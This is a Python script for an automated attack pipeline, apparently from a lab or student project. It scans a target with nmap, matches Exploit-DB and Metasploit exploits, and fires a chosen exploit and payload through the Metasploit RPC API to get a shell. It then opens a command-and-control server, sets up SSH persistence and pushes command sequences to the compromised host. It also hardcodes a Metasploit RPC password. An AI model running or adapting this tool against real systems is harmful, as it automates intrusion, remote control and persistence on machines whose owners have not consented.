#!/usr/bin/python3

import os
import shutil
import subprocess
import pprint
import json
import autopayload
import autoexploit
import sequences
from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule
import time
from logs import LOG
import post.postexploit as postexploit
import sys
import re
from pathlib import Path

RED = "\033[1;31m"
YELLOW = "\033[33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

LOW = "Low"
MEDIUM = BLUE + "Medium" + RESET
HIGH = YELLOW + "High" + RESET
CRITICAL = RED + "Critical" + RESET

SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}


logfile = open("./logtest", "a+")

LOG("Launched autopwn.", logfile, "inf")

IP = "192.168.1.45"
EXPLOIT_LIST = "./exploit_list"

debug = 0


def show_pwnguin():
    """Displays pwngin ASCII art logo, nothing useful"""
    print(
        f"""
                                            (#(
                                        @@@/#&@&
                                  (&@@@,#&&@@&&&&&&&@@(
                             #@@@( %&&&&&&&@@@@@@@@@@
                         ,@@%/&&&&@@@@@@@@@@@@@@@@@@@@,
                       @@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@&
                    ,@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                   @@@&&@@&@#,,&@@@@@@@@@@@@@@@@%**%@@@@@@@@&
                 #@@@@@@%          %@@@@@@@@(          @@@@@@@,
                @@@@@@@   @@&        (@@@@,        @@&  /@@@@@@&
               @@@@@@@.    ,%@{RED}@@{RESET}&,     %     /@{RED}@@{RESET}@(,    #@@@@@@&
              @@@@@@@@    ..@@{RED}&..{RESET}@@@.    #@@{RED}@...@{RESET}@@,     @@@@@@@#
             &@@@@@@@@      {BLUE},@@@@@@{RESET}  .{YELLOW}%({RESET}  {BLUE}./@@@@@@,{RESET}      @@@@@@@@/
            /@@#&@@@@@            ,@{YELLOW}@&.  /@{RESET}@@            @@@@@&%@@
            @@/&&#@@@@@          @@{YELLOW}((/,*///%{RESET}@%          @@@@@%&&#@@
           .@&%@&@,@@@@@         .,/@{YELLOW}@/(((@{RESET}@,.          @@@@@.&&@#@@
           ,@(@@@&&,/@@@@.         ...{YELLOW}%@@/{RESET},.          ,@@@@,(&@@@&&@.
            """
    )


# TODO : Changer le exit par une exception
def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
    """Scans IP looking for vulnerabilities and output the
    related exploit list to be parsed (in json)
    """
    if debug == 0:
        cmd = "./nmap.sh " + ip + " >> /dev/null"
        msg = "Launching scan over @" + ip + " cmd :" + cmd
        print("[i] Launching scan over @" + ip + " cmd :" + cmd)
        LOG(msg, logfile, "log")
        scan = subprocess.run(cmd, shell=True)

        if "0 hosts up" in Path("./detect.xml").read_text():
            raise Exception("HostIsDown")

        if scan:
            msg = "Scan over successfully"
            print("[V] Scan over successfully")
            LOG(msg, logfile, "log")
        else:
            LOG("Error 1 : nmap failed.", logfile, "err")
            print("[X] Error 1 : nmap failed.")
            return []
        cmd = "./explook.sh >> /dev/null"
        msg = "Retrieving exploits"
        print("[i] Retrieving exploits")
        LOG(msg, logfile, "log")
        scan = subprocess.run(cmd, shell=True)
    with open(exploit_path, "r+") as f:
        result = json.loads(f.read())
    return result


def convert_path(path: str) -> str:
    """Convert edb exploit path to local path"""
    plat = str(path.split("/")[4])
    if "lin" in plat:
        dest_path = "./edb/lin/" + str(path.split("/")[-1])
    elif "mult" in plat:
        dest_path = "./edb/mult/" + str(path.split("/")[-1])
    elif "win" in plat:
        dest_path = "./edb/win/" + str(path.split("/")[-1])
    elif "cgi" in plat:
        dest_path = "./edb/cgi/" + str(path.split("/")[-1])
    else:
        dest_path = "./edb/oth/" + str(path.split("/")[-1])
    return dest_path


# TODO Définir une liste d'extensions dépréciées pour les exploit récupérés sur edb.
def getEdbExploit(res=[], get_all=False):
    """Retrieve EDB exploits that are missing in metasploit"""
    edbExploits = []
    LOG("Retrieving EDB exploits...", logfile, "log")
    for search in res:
        edbExploits += search["RESULTS_EXPLOIT"]
    paths = []
    if edbExploits:
        for pwn in edbExploits:
            if not ("(Metasploit)" in pwn["Title"]):
                paths.append(pwn["Path"])
    if paths:
        for path in paths:
            ext = str(path.split("/")[-1]).split(".")[-1]
            if get_all or not (ext in ["txt", "md"]):
                dest_path = convert_path(path)
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy(path, dest_path)
    LOG("EDB exploits retrieved", logfile, "log")


def showEdbExploit(exploitPath="") -> None:
    with open(exploitPath, "r+") as f:
        prog = f.readlines()
    pprint.pprint(prog)


def createExploitList(res=[]) -> tuple[list[str], list[str]]:
    """Create exploits / metasploits lists from the list of research
    returns (titles, metaexploits)
    """
    exploits = []
    for search in res:
        exploits += search["RESULTS_EXPLOIT"]
    LOG("Imported exploit_list", logfile, "log")
    if exploits:
        noDuplicattes = []
        [noDuplicattes.append(i) for i in exploits if not noDuplicattes.count(i)]
        exploits = noDuplicattes
        titles = [pwn["Title"] for pwn in exploits]
        titles = [[k, title] for k, title in enumerate(titles)]
    else:
        LOG("Error 2 : Parsing error or no exploits.", logfile, "err")
        print("[X] Error 2 : Parsing error or no exploits.")
        return []
    LOG("Parsed ./exploit_list", logfile, "log")
    metaexploits = []
    for j in range(len(titles)):
        if "(Metasploit)" in titles[j][1]:
            metaexploits.append(titles[j])
    return (exploits, titles, metaexploits)


def selectExploit(choice=0, titles=[]) -> str:
    return titles[int(choice)][1][:-12]


def runMetasploit(reinit=False, show=True, wait=True) -> MsfRpcClient:
    """Launch metasploit instance and returns associated client
    It is also possible to reinit the db if reinit = True (must be root!!!)
    """
    redirect = None
    if not show:
        redirect = subprocess.DEVNULL

    proc = subprocess.run(
        "msfrpcd -P yourpassword", shell=True, stdout=redirect, stderr=redirect
    )
    if wait:
        time.sleep(5)
    LOG("Started process msfrpcd", logfile, "inf")

    if reinit:
        proc = subprocess.run(
            "echo yes | msfdb reinit", shell=True, stdout=redirect, stderr=redirect
        )  # if db problem
        LOG("Started process msfdb (arg reinit)", logfile, "inf")

    client = MsfRpcClient("yourpassword", ssl=True)
    print("\n")
    return client


def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
    LOG("Looking for best modules...", logfile, "log")
    attack_cpy = attack
    modules = []
    while len(attack_cpy) > 10 and modules == []:
        modules = client.modules.search(attack_cpy)
        attack_cpy = attack_cpy[:-3]
    print("[~] Available modules :")
    for k in range(len(modules)):
        pprint.pprint(
            str(k) + " : " + modules[k]["type"] + " : " + modules[k]["fullname"]
        )
    LOG("Displayed modules", logfile, "log")
    if modules == []:
        LOG("Error 8 : Module error.", logfile, "err")
        print("[X] Error 8 : Module error, no module.")
        # raise Exception("NoModuleFound")
        return []
    return modules


def selectExploitMS(
    client: MsfRpcClient, exploit_fullname: str
) -> tuple[ExploitModule, list[str]]:
    """Select the exploit to use, return it with the available payloads"""
    exploit_ms = client.modules.use("exploit", exploit_fullname)
    return exploit_ms, exploit_ms.targetpayloads()


def selectPayloadMS(client: MsfRpcClient, payload_fullname: str) -> PayloadModule:
    """Select the payload to use"""
    return client.modules.use("payload", payload_fullname)


def exploitVuln(
    Rhosts="192.168.1.45",
    Lhost="192.168.1.37",
    auto_mode=False,
    client=None,
    modlist=[],
) -> None:
    """Execute selected payload on the targeted"""
    exploit = client.modules.use(modlist[0]["type"], modlist[0]["fullname"])
    print("[V] Selected payloads: ", exploit.info)

    print("Exploit options :")
    LOG("Displaying exploit options", logfile, "log")
    print(exploit.options)
    print("\n")

    plds = exploit.targetpayloads()
    LOG("Displaying payload options", logfile, "log")
    print("[~] Available payloads :")
    pprint.pprint(plds)
    print("[-1 for autochosing]")
    if auto_mode:
        pay_idx = -1
    else:
        pay_idx = int(input("Which payload do you want to use ? :"))

    print("")
    if pay_idx == -1:
        tmp = autopayload.autochose(exploit.targetpayloads())
        LOG("Auto chosing payload", logfile, "log")
        if tmp == -1:
            payload = client.modules.use("payload", plds[0])
            LOG("Could not auto select payload", logfile, "log")
            print("No usual payload available, reflected to : " + plds[0])
        else:
            payload = client.modules.use("payload", tmp)
            print("Autopayload selected : " + tmp)
            LOG("Payload auto selected", logfile, "log")
    else:
        payload = client.modules.use("payload", plds[pay_idx])
        LOG("User selected payload", logfile, "log")
    print("[V] Payload selected !")
    print("\n")

    for i in payload.missing_required:
        if i == "RHOSTS":
            payload[i] = Rhosts
        elif i == "LHOST":
            payload[i] = Lhost
        else:
            payload[i] = input(i + ": ")

    for i in exploit.missing_required:
        if i == "RHOSTS":
            exploit[i] = Rhosts
        elif i == "LHOST":
            exploit[i] = Lhost
        else:
            exploit[i] = input(i + ": ")
    LOG("Payload and exploit options set", logfile, "log")
    print(exploit.execute(payload=payload))
    # cid = client.consoles.console().cid
    # client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
    while len(client.jobs.list) != 0:
        pass
    if client.sessions.list == {}:
        LOG("Error 9 : Exploit could not be executed", logfile, "err")
        print("[X] Error 9 : Exploit could not be executed")
        raise Exception("ExploitFailure")


def getShell(client: MsfRpcClient = None, id="1"):
    """Get shell from ID session"""
    LOG("Shell obtained", logfile, "log")
    try:
        return client.sessions.session(id)
    except:
        print("[X] Error 10 : No shell created")
        LOG("Error 10 : No shell created", logfile, "err")
        raise Exception("ErrorWhileGettingShell")
        # exit(-10)


def sendCommands(shell, sequence=[]) -> int:
    """Automated interaction with shell on target"""
    if len(sequence) == 0:
        print("[X] Error 5 : Invalid sequence.")
        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
        raise Exception("InvalidSequence")

    for command in sequence:
        print(command)
        shell.write(command)
        time.sleep(5)  # Todo : modifier le sleep
        print(shell.read())
    return 0


def flushProcesses() -> int:
    proc = subprocess.run(
        "kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True
    )
    # print(proc)
    proc = subprocess.run(
        "kill $(ps aux | grep 'python3 -m http.server' | awk '{print $2}')", shell=True
    )
    # print(proc)
    return 0


def autopwn(
    Rhosts="192.168.1.45",
    Lhost="192.168.1.37",
    generic_exploit=True,
    get_edb_exploits=False,
    com_and_cont=False,
    auto_mode=False,
) -> tuple[None, MsfRpcClient, str]:
    """Autopwn function."""
    show_pwnguin()

    results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
    LOG("Vulnerabilities scanned", logfile, "log")
    (_, exploits, metaexploits) = createExploitList(results)
    client = runMetasploit(False)

    if generic_exploit and get_edb_exploits:
        getEdbExploit(results)

    if generic_exploit:
        if exploits:
            print("[~] All exploits :")
            pprint.pprint(exploits)
            LOG("Displayed all possible exploits to user", logfile, "log")
            print("\n")
        else:
            LOG("Error 3 : No exploits found on EDB.", logfile, "err")
            print("[X] Error 3 : No exploits found on EDB.")
            exit(-3)

        if metaexploits:
            print("[~] Metasploit exploits :")
            pprint.pprint(metaexploits)
            LOG("Displayed possible Metasploit exploits to user", logfile, "log")
            print("\n")
        else:
            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
            print("[i] INFO : No exploit found on Metasploit.")

    else:
        if metaexploits:
            print("[~] Metasploit exploits :")
            pprint.pprint(metaexploits)
            LOG("Displayed possible Metasploit exploits to user", logfile, "log")
            print("\n")
        else:
            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
            print("[i] INFO : No exploit found on Metasploit.")

    if auto_mode:
        choice = "-1"
        print("[i] Automatic mode activated ! Selecting best exploit for you.")
        LOG("Using auto select mode for chosing exploits", logfile, "log")
    else:
        choice = input("[~] Please select an exploit: ")

    if choice == "-1":
        choice = str(autoexploit.autochose(metaexploits, client))
        if choice == "-1":
            LOG("Could not auto select exploit", logfile, "log")
            choice = input("[~] Could not auto select, please select manually ")
    attack = selectExploit(choice, exploits)
    attack = re.sub("[^0-9a-zA-Z./()]+", " ", attack)
    LOG("Exploit select : " + attack, logfile, "log")
    print("[V] Exploit selected ! :")
    print(attack)
    print("\n")

    print("Starting msfrpcd...")

    modlist = searchModules(client, attack)
    LOG("Modules retrieved", logfile, "log")
    exploitVuln(Rhosts, Lhost, auto_mode, client, modlist)

    print(client.sessions.list)
    print("\n")

    shell = getShell(client, "1")
    LOG("Shell Created", logfile, "log")
    if com_and_cont:
        print("[~] Entering command and control section")
        LOG("Entered in C&C section", logfile, "inf")

        print("[~] Opening local C2 server ...")
        (proc, port) = postexploit.openCtrlSrv(Lhost)
        ipport = "http://" + Lhost + ":" + str(port)
    else:
        ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
    print("[V] Pwn complete !!! ")
    LOG("Pwn Complete ", logfile, "log")
    return (shell, client, ipport)


if __name__ == "__main__":

    # showEdbExploit("./edb/2444.sh")
    # showEdbExploit("./edb/2444.sh")

    if debug == 1:
        print("**** RUNNING IN DEBUG MODE ****")

    flushProcesses()
    Rhosts = "192.168.1.45"
    Lhost = "192.168.1.86"

    if len(sys.argv) > 1:
        IP = sys.argv[1]
        Rhosts = sys.argv[1]
        if len(sys.argv) > 2:
            Lhost = sys.argv[2]

    try:
        (shell, client, srv) = autopwn(
            Rhosts=Rhosts,
            Lhost=Lhost,
            generic_exploit=True,
            get_edb_exploits=True,
            com_and_cont=True,
            auto_mode=True,
        )
    except:
        print("An error has occured.")
        exit(-1)

    LOG("Begin setup for SSH persistence", logfile, "log")
    print("[~] Begin setup for SSH persistence")
    subprocess.run("./makesshkeys.sh", shell=True)
    print("[V] SSH setup done")
    LOG("Begin sending sequences", logfile, "log")
    sendCommands(shell, sequences.getsequence(3, srv))
    LOG("Sequences sent", logfile, "log")
    LOG("END OF LOGS", logfile, "crit")
    logfile.close()
    exit(0)
